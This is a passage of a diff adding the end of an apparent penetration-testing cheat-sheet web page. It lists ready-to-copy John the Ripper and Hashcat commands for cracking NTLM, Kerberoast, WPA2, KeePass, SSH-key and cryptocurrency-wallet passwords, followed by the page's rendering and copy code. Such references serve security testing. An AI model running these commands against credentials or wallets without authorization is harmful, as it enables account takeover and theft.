+{t:'Raw SHA1 Hash',c:'john --format=raw-sha1 --wordlist=$WL hashes.txt',d:'Cracks SHA1 hashes which are slightly stronger than MD5 but still considered cryptographically broken. Common in older web applications and databases.'},
+{t:'Raw SHA256 Hash',c:'john --format=raw-sha256 --wordlist=$WL hashes.txt',d:'Cracks unsalted SHA256 hashes. While SHA256 is a strong algorithm, without salting it remains vulnerable to dictionary attacks and rainbow tables.'},
+{t:'Raw SHA512 Hash',c:'john --format=raw-sha512 --wordlist=$WL hashes.txt',d:'Cracks SHA512 hashes which produce a 128-character hex digest. Unsalted SHA512 is crackable at high speed on modern GPUs despite being computationally expensive.'},
+{t:'NTLM Windows Hash',c:'john --format=nt --wordlist=$WL ntlm.txt',d:'Cracks Windows NTLM password hashes extracted from SAM databases or NTDS.dit. NTLM is unsalted, making it vulnerable to rapid dictionary and rainbow table attacks.'},
+{t:'NTLMv2 Net Hash',c:'john --format=netntlmv2 --wordlist=$WL netntlm.txt',d:'Cracks NTLMv2 challenge-response hashes captured from network traffic using tools like Responder. These are slower to crack than pure NTLM but still feasible.'},
+{t:'bcrypt Hash',c:'john --format=bcrypt --wordlist=$WL bcrypt.txt',d:'Cracks bcrypt hashes which are intentionally slow to compute. bcrypt is considered strong, so cracking focuses on weak passwords using targeted wordlists rather than brute force.'},
+{t:'ZIP Password Crack',c:'zip2john protected.zip > zip.hash && john --wordlist=$WL zip.hash',d:'Extracts the password hash from a ZIP archive using zip2john, then cracks it with a wordlist. Works on both traditional PKZIP and modern AES-encrypted ZIP files.'},
+{t:'RAR Password Crack',c:'rar2john protected.rar > rar.hash && john --wordlist=$WL rar.hash',d:'Extracts and cracks RAR archive passwords. RAR uses strong encryption, so success depends on the password being in your wordlist or crackable with rules.'},
+{t:'7z Password Crack',c:'7z2john protected.7z > 7z.hash && john --wordlist=$WL 7z.hash',d:'Extracts password hashes from 7-Zip archives using the 7z2john utility. 7z uses AES-256 encryption, making brute force impractical for strong passwords.'},
+{t:'SSH Private Key Crack',c:'ssh2john id_rsa > ssh.hash && john --wordlist=$WL ssh.hash',d:'Cracks the passphrase protecting an encrypted SSH private key. Found SSH keys during engagements often have weak passphrases that can be cracked with common wordlists.'},
+{t:'PGP/GPG Key Crack',c:'gpg2john private.key > gpg.hash && john --wordlist=$WL gpg.hash',d:'Extracts and cracks the passphrase from a PGP or GPG private key. Compromising the key passphrase provides access to all encrypted communications and files.'},
+{t:'KeePass Database Crack',c:'keepass2john database.kdbx > kp.hash && john --wordlist=$WL kp.hash',d:'Cracks the master password of a KeePass password database. A cracked KeePass database provides access to all stored credentials, making it a high-value target.'},
+{t:'PDF Password Crack',c:'pdf2john protected.pdf > pdf.hash && john --wordlist=$WL pdf.hash',d:'Extracts and cracks PDF document passwords. PDF encryption varies widely in strength, with older PDF versions using weak encryption that cracks almost instantly.'},
+{t:'Office Document Crack',c:'office2john protected.docx > office.hash && john --wordlist=$WL office.hash',d:'Cracks Microsoft Office document passwords from Word, Excel, or PowerPoint files. Modern Office encryption is strong but weak passwords remain common.'},
+{t:'Bitcoin Wallet Crack',c:'bitcoin2john wallet.dat > btc.hash && john --wordlist=$WL btc.hash',d:'Extracts and cracks the encryption password from a Bitcoin wallet.dat file. Successful cracking provides access to all cryptocurrency stored in the wallet.'},
+{t:'Ethereum Keystore Crack',c:'ethereum2john keystore.json > eth.hash && john --wordlist=$WL eth.hash',d:'Cracks Ethereum keystore file passwords which use scrypt or PBKDF2 key derivation. The key derivation is intentionally slow, limiting cracking speed significantly.'},
+{t:'With Best64 Rules',c:'john --wordlist=$WL --rules=best64 hashes.txt',d:'Applies the best64 rule set which performs 64 common password transformations on each wordlist entry. Catches variations like capitalizing the first letter, appending numbers, and leet speak.'},
+{t:'With Jumbo Rules',c:'john --wordlist=$WL --rules=Jumbo hashes.txt',d:'Uses the comprehensive Jumbo ruleset with thousands of transformations. Takes much longer but dramatically increases the chance of cracking complex password variations.'},
+{t:'KoreLogic Rules',c:'john --wordlist=$WL --rules=KoreLogicRules hashes.txt',d:'Applies KoreLogic contest rules that were developed for password cracking competitions. These rules are specifically designed to crack the most common password patterns humans create.'},
+{t:'Mask Attack',c:'john --mask="?u?l?l?l?l?d?d?d?d" hashes.txt',d:'Uses a mask to try all passwords matching a specific pattern: one uppercase, four lowercase, four digits. Extremely effective when you know the password policy requirements.'},
+{t:'Incremental Mode',c:'john --incremental hashes.txt',d:'Tries every possible character combination starting from the shortest. This pure brute force approach is the slowest but will eventually crack any password given enough time.'},
+{t:'Show Cracked Passwords',c:'john --show hashes.txt',d:'Displays all previously cracked passwords from the john.pot file. Use this after a cracking session to see which passwords were successfully recovered.'},
+{t:'Show Specific Format',c:'john --show --format=raw-md5 hashes.txt',d:'Shows cracked passwords filtered by hash format. Useful when your hash file contains multiple formats and you want to see results for a specific type only.'},
+{t:'List Supported Formats',c:'john --list=formats',d:'Displays all hash formats that john can crack. Essential for identifying the correct format flag to use when john does not auto-detect the hash type correctly.'},
+{t:'Fork Parallel Processing',c:'john --wordlist=$WL --fork=4 hashes.txt',d:'Splits the cracking work across 4 parallel processes. Set this to the number of CPU cores for maximum cracking performance on multi-core systems.'},
+{t:'Session Save and Restore',c:'john --wordlist=$WL --session=mysession hashes.txt',d:'Names the cracking session so it can be interrupted and resumed later. The session file stores progress so you can stop and continue without losing work.'},
+{t:'Restore Previous Session',c:'john --restore=mysession',d:'Resumes a previously interrupted cracking session from exactly where it left off. Essential for long-running cracking jobs that may need to be paused and continued.'},
+]},
+Hashcat:{cat:'Crack',cmds:[
+{t:'MD5 Dictionary Attack',c:'hashcat -m 0 -a 0 hashes.txt $WL',d:'Cracks MD5 hashes using a straight dictionary attack on GPU. MD5 (mode 0) is the fastest hash to crack, achieving billions of attempts per second on modern GPUs.'},
+{t:'MD5 with Best64 Rule',c:'hashcat -m 0 -a 0 hashes.txt $WL -r rules/best64.rule',d:'Applies the best64 rule file which transforms each wordlist entry 64 different ways. This multiplies your wordlist effectiveness by testing common password modifications.'},
+{t:'MD5 with Dive Rule',c:'hashcat -m 0 -a 0 hashes.txt $WL -r rules/dive.rule',d:'Uses the comprehensive dive ruleset with over 99,000 transformation rules. Extremely thorough but proportionally slower as each word generates thousands of candidates.'},
+{t:'MD5 Combinator Attack',c:'hashcat -m 0 -a 1 hashes.txt $WL wordlist2.txt',d:'Combines every word from the first wordlist with every word from the second. Catches passwords like "solarwindows" that are formed by joining two dictionary words.'},
+{t:'MD5 Brute Force Mask',c:'hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a',d:'Tries all possible 7-character combinations using all printable ASCII characters. The ?a mask covers lowercase, uppercase, digits, and special characters.'},
+{t:'MD5 Hybrid Wordlist+Mask',c:'hashcat -m 0 -a 6 hashes.txt $WL ?d?d?d?d',d:'Appends 4 digits to every wordlist entry. Catches extremely common patterns like "password1234" where users add numbers to meet complexity requirements.'},
+{t:'MD5 Hybrid Mask+Wordlist',c:'hashcat -m 0 -a 7 hashes.txt ?d?d?d?d $WL',d:'Prepends 4 digits before every wordlist entry. Covers patterns like "2024password" where users place numbers at the beginning of their base password.'},
+{t:'SHA1 Dictionary',c:'hashcat -m 100 -a 0 hashes.txt $WL',d:'Cracks SHA1 hashes (mode 100) using a dictionary attack. SHA1 is deprecated but still found in legacy applications and older database dumps.'},
+{t:'SHA256 Dictionary',c:'hashcat -m 1400 -a 0 hashes.txt $WL',d:'Cracks raw SHA256 hashes using a straight dictionary attack. SHA256 is commonly used in modern web applications and cryptocurrency-related systems.'},
+{t:'SHA256 with Rules',c:'hashcat -m 1400 -a 0 hashes.txt $WL -r rules/best64.rule',d:'Applies password mutation rules to SHA256 cracking. Rules are essential because SHA256 is too slow for brute force, making smart wordlist manipulation critical.'},
+{t:'SHA512 Dictionary',c:'hashcat -m 1700 -a 0 hashes.txt $WL',d:'Cracks raw SHA512 hashes which are computationally expensive even on GPUs. Focus on targeted wordlists and smart rules rather than brute force approaches.'},
+{t:'SHA512 Unix Crypt',c:'hashcat -m 1800 -a 0 hashes.txt $WL',d:'Cracks sha512crypt hashes (starting with $6$) from Linux shadow files. These use 5000 rounds of SHA512 by default, making them very slow to crack.'},
+{t:'NTLM Dictionary',c:'hashcat -m 1000 -a 0 hashes.txt $WL',d:'Cracks Windows NTLM hashes at extreme speed since NTLM is an unsalted MD4 variant. Modern GPUs can test over 100 billion NTLM candidates per second.'},
+{t:'NTLM with Rules',c:'hashcat -m 1000 -a 0 hashes.txt $WL -r rules/best64.rule -r rules/toggles1.rule',d:'Chains two rule files together for NTLM cracking. The first file mutates passwords and the second toggles letter cases, creating a comprehensive transformation matrix.'},
+{t:'NTLMv2 Net Hash',c:'hashcat -m 5600 -a 0 hashes.txt $WL',d:'Cracks NTLMv2 challenge-response hashes captured from the network. These are salted and slower to crack than pure NTLM but still feasible with good wordlists.'},
+{t:'NetNTLMv1',c:'hashcat -m 5500 -a 0 hashes.txt $WL',d:'Cracks NTLMv1 network authentication hashes. NTLMv1 is weaker than v2 and can sometimes be downgraded in attacks using tools like Responder.'},
+{t:'bcrypt Dictionary',c:'hashcat -m 3200 -a 0 hashes.txt $WL',d:'Cracks bcrypt hashes which are intentionally slow with configurable cost factors. Even with GPUs, bcrypt cracking is limited to thousands of attempts per second.'},
+{t:'scrypt',c:'hashcat -m 8900 -a 0 hashes.txt $WL',d:'Cracks scrypt hashes which are designed to be memory-hard, limiting GPU parallelism. Use highly targeted wordlists since brute force is impractical.'},
+{t:'WPA2 PMKID Dictionary',c:'hashcat -m 22000 -a 0 capture.hc22000 $WL',d:'Cracks WPA2 WiFi passwords from PMKID captures. The PMKID attack does not require capturing a full handshake, needing only a single EAPOL frame from the AP.'},
+{t:'WPA2 PMKID with Rules',c:'hashcat -m 22000 -a 0 capture.hc22000 $WL -r rules/best64.rule',d:'Applies mutation rules to WPA2 cracking for better coverage. Since WPA2 key derivation is slow, rules provide a much better return on investment than brute force.'},
+{t:'Kerberos 5 TGS-REP',c:'hashcat -m 13100 -a 0 tgs.txt $WL',d:'Cracks Kerberoasting TGS-REP hashes extracted from Active Directory. Service account passwords encrypted in these tickets are often weak and crackable.'},
+{t:'Kerberos 5 AS-REP',c:'hashcat -m 18200 -a 0 asrep.txt $WL',d:'Cracks AS-REP roasting hashes from accounts with pre-authentication disabled. These are obtained without authentication and often have weak service passwords.'},
+{t:'MSSQL 2012+',c:'hashcat -m 1731 -a 0 hashes.txt $WL',d:'Cracks MSSQL 2012 and newer password hashes using SHA512-based hashing. Extracted from master.mdf database files or through SQL injection.'},
+{t:'MySQL 4.1+',c:'hashcat -m 300 -a 0 hashes.txt $WL',d:'Cracks MySQL 4.1+ password hashes which use double SHA1. These can be extracted from the mysql.user table when you have database read access.'},
+{t:'PostgreSQL MD5',c:'hashcat -m 12 -a 0 hashes.txt $WL',d:'Cracks PostgreSQL MD5 authentication hashes. PostgreSQL prepends the username as a salt, so you need to know the username associated with each hash.'},
+{t:'Cisco Type 5',c:'hashcat -m 500 -a 0 hashes.txt $WL',d:'Cracks Cisco IOS Type 5 enable secret passwords which use MD5-crypt. Found in router and switch configuration files obtained during network penetration tests.'},
+{t:'Django SHA1',c:'hashcat -m 124 -a 0 hashes.txt $WL',d:'Cracks Django framework password hashes that use salted SHA1. Older Django applications may still use this format before the framework switched to PBKDF2.'},
+{t:'WordPress phpass',c:'hashcat -m 400 -a 0 hashes.txt $WL',d:'Cracks WordPress password hashes which use portable phpass hashing based on MD5 with multiple iterations. Extracted from the wp_users database table.'},
+{t:'Show Cracked Results',c:'hashcat -m 0 hashes.txt --show',d:'Displays all previously cracked hash-password pairs from the hashcat potfile. Run this after a cracking session to retrieve the plaintext passwords.'},
+{t:'GPU Optimized Workload',c:'hashcat -m 0 -a 0 hashes.txt $WL --status -w 4 -O --force',d:'Maximizes GPU utilization with workload profile 4 and optimized kernels. Shows real-time status updates. The --force flag bypasses GPU compatibility warnings.'},
+{t:'Benchmark All Modes',c:'hashcat -b --force',d:'Benchmarks your GPU performance across all supported hash modes. Shows exactly how many hashes per second your hardware can crack for each algorithm.'},
+{t:'Session Restore',c:'hashcat --session=crack1 --restore',d:'Resumes a previously interrupted cracking session from the exact point it stopped. Sessions are automatically saved, allowing interruption and continuation.'},
+{t:'Custom Charset Mask',c:'hashcat -m 0 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1?1?1',d:'Defines a custom character set combining lowercase letters and digits, then uses it in a mask. Creates targeted brute force patterns matching specific password policies.'},
+{t:'Prince Attack',c:'hashcat -m 0 -a 0 hashes.txt $WL --prince',d:'Uses the PRINCE algorithm which generates password candidates by combining words from the wordlist in probabilistic order. Effective against multi-word passwords and passphrases.'},
+]}
+};
+
+var activeTool='Subfinder';
+var btns=document.querySelectorAll('.tool-btn');
+btns.forEach(function(b){
+if(b.dataset.tool===activeTool)b.classList.add('active');
+b.addEventListener('click',function(){
+activeTool=this.dataset.tool;
+btns.forEach(function(x){x.classList.remove('active')});
+this.classList.add('active');
+render();
+if(window.innerWidth<768){document.getElementById('sidebar').classList.add('collapsed');document.getElementById('main').classList.add('expanded')}
+});
+});
+
+function render(){
+var ws=$('workspace');
+var tool=TOOLS[activeTool];
+if(!tool){ws.innerHTML='<div class="empty-state">Select a tool</div>';return}
+var q=$('search').value.toLowerCase();
+ws.innerHTML='';
+tool.cmds.forEach(function(cmd){
+var compiled=compile(cmd.c);
+if(q&&compiled.toLowerCase().indexOf(q)===-1&&cmd.t.toLowerCase().indexOf(q)===-1&&cmd.d.toLowerCase().indexOf(q)===-1)return;
+var card=document.createElement('div');
+card.className='card';
+card.innerHTML='<div class="card-head"><span>'+cmd.t+'</span><span class="card-tag">'+tool.cat+'</span></div><div class="card-body"><pre contenteditable="true" spellcheck="false">'+compiled+'</pre><button class="copy-btn" onclick="copyCmd(this)">Copy</button></div><div class="card-desc">'+cmd.d+'</div>';
+ws.appendChild(card);
+});
+if(!ws.children.length)ws.innerHTML='<div class="empty-state">No matching commands</div>';
+}
+
+function copyCmd(btn){
+var pre=btn.previousElementSibling;
+var t=pre.textContent;
+navigator.clipboard.writeText(t).then(function(){
+btn.textContent='Copied';
+btn.classList.add('copied');
+setTimeout(function(){btn.textContent='Copy';btn.classList.remove('copied')},1000);
+});
+}
+
+render();
+</script>
+</body>
+</html>
